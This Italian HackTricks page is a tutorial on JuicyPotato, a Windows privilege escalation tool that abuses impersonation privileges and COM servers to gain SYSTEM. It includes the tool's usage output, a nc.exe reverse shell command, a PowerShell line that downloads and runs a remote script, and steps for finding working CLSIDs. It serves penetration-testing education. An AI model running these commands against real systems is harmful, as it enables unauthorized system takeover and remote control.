# JuicyPotato

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark web** che offre funzionalità **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.

Il loro obiettivo principale di WhiteIntel è combattere i takeover di account e gli attacchi ransomware derivanti da malware che rubano informazioni.

Puoi controllare il loro sito web e provare il loro motore **gratuitamente** su:

{% embed url="https://whiteintel.io" %}

---

{% hint style="warning" %}
**JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 in poi. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) possono essere utilizzati per **sfruttare gli stessi privilegi e ottenere accesso di livello `NT AUTHORITY\SYSTEM`**. _**Controlla:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (sfruttando i privilegi dorati) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Una versione zuccherata di_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un po' di succo, ovvero **un altro strumento di Escalation dei Privilegi Locali, da Account Servizio Windows a NT AUTHORITY\SYSTEM**_

#### Puoi scaricare juicypotato da [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Riassunto <a href="#summary" id="summary"></a>

[Dal Readme di juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) e le sue [varianti](https://github.com/decoder-it/lonelypotato) sfruttano la catena di escalation dei privilegi basata sul servizio [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) avendo il listener MiTM su `127.0.0.1:6666` e quando si hanno i privilegi `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisione della build di Windows abbiamo trovato una configurazione in cui `BITS` era intenzionalmente disabilitato e la porta `6666` era occupata.

Abbiamo deciso di rendere armaiolo [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Diamo il benvenuto a Juicy Potato**.

> Per la teoria, vedi [Rotten Potato - Escalation dei Privilegi da Account Servizio a SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) e segui la catena di link e riferimenti.

Abbiamo scoperto che, oltre a `BITS`, ci sono diversi server COM che possiamo abusare. Devono solo:

1. essere istanziabili dall'utente corrente, di solito un "utente servizio" che ha privilegi di impersonificazione
2. implementare l'interfaccia `IMarshal`
3. essere eseguiti come utente elevato (SYSTEM, Amministratore, …)

Dopo alcuni test abbiamo ottenuto e testato un elenco esteso di [CLSID interessanti](http://ohpe.it/juicy-potato/CLSID/) su diverse versioni di Windows.

### Dettagli succulenti <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato ti consente di:

* **Target CLSID** _scegli qualsiasi CLSID che desideri._ [_Qui_](http://ohpe.it/juicy-potato/CLSID/) _puoi trovare l'elenco organizzato per OS._
* **Porta di ascolto COM** _definisci la porta di ascolto COM che preferisci (anziché il 6666 codificato in modo rigido)_
* **Indirizzo IP di ascolto COM** _vincola il server su qualsiasi IP_
* **Modalità di creazione del processo** _a seconda dei privilegi dell'utente impersonato puoi scegliere tra:_
* `CreateProcessWithToken` (necessita di `SeImpersonate`)
* `CreateProcessAsUser` (necessita di `SeAssignPrimaryToken`)
* `entrambi`
* **Processo da avviare** _avvia un eseguibile o script se l'exploit ha successo_
* **Argomento del processo** _personalizza gli argomenti del processo avviato_
* **Indirizzo del server RPC** _per un approccio stealthy puoi autenticarti a un server RPC esterno_
* **Porta del server RPC** _utile se vuoi autenticarti a un server esterno e il firewall blocca la porta `135`…_
* **Modalità TEST** _principalmente per scopi di test, cioè testare i CLSID. Crea il DCOM e stampa l'utente del token. Vedi_ [_qui per il testing_](http://ohpe.it/juicy-potato/Test/)
### Utilizzo <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Considerazioni finali <a href="#final-thoughts" id="final-thoughts"></a>

[**Dalla guida di juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Se l'utente ha i privilegi `SeImpersonate` o `SeAssignPrimaryToken`, allora sei **SYSTEM**.

È quasi impossibile prevenire l'abuso di tutti questi Server COM. Potresti pensare di modificare le autorizzazioni di questi oggetti tramite `DCOMCNFG`, ma buona fortuna, sarà una sfida.

La soluzione effettiva è proteggere gli account sensibili e le applicazioni che vengono eseguite con gli account `* SERVICE`. Arrestare `DCOM` certamente inibirà questo exploit ma potrebbe avere un impatto serio sul sistema operativo sottostante.

Da: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Esempi

Nota: Visita [questa pagina](https://ohpe.it/juicy-potato/CLSID/) per una lista di CLSID da provare.

### Ottenere una shell inversa con nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Avvia un nuovo CMD (se hai accesso RDP)

![](<../../.gitbook/assets/image (297).png>)

## Problemi con CLSID

Spesso, il CLSID predefinito che JuicyPotato utilizza **non funziona** e l'exploit fallisce. Di solito, sono necessari diversi tentativi per trovare un **CLSID funzionante**. Per ottenere un elenco di CLSID da provare per un sistema operativo specifico, dovresti visitare questa pagina:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Verifica dei CLSID**

Innanzitutto, avrai bisogno di alcuni eseguibili diversi da juicypotato.exe.

Scarica [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e caricalo nella tua sessione PS, scarica ed esegui [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Quello script creerà un elenco di possibili CLSID da testare.

Successivamente, scarica [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(modifica il percorso dell'elenco CLSID e dell'eseguibile juicypotato) ed eseguilo. Inizierà a provare ogni CLSID e **quando il numero di porta cambia, significherà che il CLSID ha funzionato**.

**Verifica** i CLSID funzionanti **utilizzando il parametro -c**

## Riferimenti

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark web** che offre funzionalità **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.

Il loro obiettivo principale è contrastare le violazioni degli account e gli attacchi ransomware derivanti da malware che rubano informazioni.

Puoi visitare il loro sito web e provare il loro motore **gratuitamente** su:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
